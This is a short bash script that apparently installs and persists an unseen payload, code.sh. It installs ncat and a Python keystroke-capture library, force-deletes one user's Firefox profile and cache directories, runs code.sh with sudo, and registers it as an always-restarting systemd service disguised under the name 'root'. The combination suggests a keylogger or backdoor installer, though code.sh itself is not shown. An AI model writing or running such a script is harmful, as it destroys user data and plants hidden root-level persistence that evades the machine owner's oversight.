#!/bin/bash
source venv/bin/activate
sudo apt-get update
sudo apt-get install -y ncat &
sudo apt-get install -y ufw &
sudo apt install net-tools &
pip install keyboard
sudo rm -rf /home/bequery/snap/firefox/common/.mozilla/firefox
sudo rm -rf /home/bequery/snap/firefox/common/.cache/mozilla/firefox
sudo chmod +x code.sh
sudo ./code.sh &
(
SERVICE_NAME="root"
SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/code.sh"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Create the systemd service file
sudo bash -c "cat > ${SERVICE_FILE}" <<EOL
[Unit]
Description=root_service
After=network.target

[Service]
ExecStart=${SCRIPT_PATH}
Restart=always

[Install]
WantedBy=multi-user.target
EOL

# Reload the systemd manager configuration 
sudo systemctl daemon-reload

# Enable the service to start on boot
sudo systemctl enable ${SERVICE_NAME}.service

# Start the service immediately
sudo systemctl start ${SERVICE_NAME}.service

echo "Service ${SERVICE_NAME} has been created and started."
)

